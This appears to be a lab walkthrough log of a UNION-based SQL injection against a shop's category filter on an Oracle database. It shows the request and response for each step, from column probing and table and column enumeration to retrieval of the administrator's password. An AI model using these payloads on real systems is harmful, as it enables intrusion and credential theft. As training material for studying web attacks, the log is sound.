# Mystery lab #6

GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL+FROM+all_tables--+ HTTP/1.1

HTTP/1.1 200 OK



GET /filter?category=Gifts'+UNION+SELECT+'NULL',+'NULL'+FROM+all_tables--+ HTTP/1.1

HTTP/1.1 200 OK



GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+all_tables--+ HTTP/1.1

HTTP/1.1 200 OK
<th>USERS_RYWMMM</th>



GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_RYWMMM'--+ HTTP/1.1

HTTP/1.1 200 OK
<th>USERNAME_DUKAMJ</th>
<th>PASSWORD_RYDASW</th>


GET /filter?category='+UNION+SELECT+NULL,PASSWORD_RYDASW+FROM+USERS_RYWMMM+WHERE+USERNAME_DUKAMJ='administrator'--+ HTTP/1.1

HTTP/1.1 200 OK
<td>f255lrifnuzupmv25agq</td>

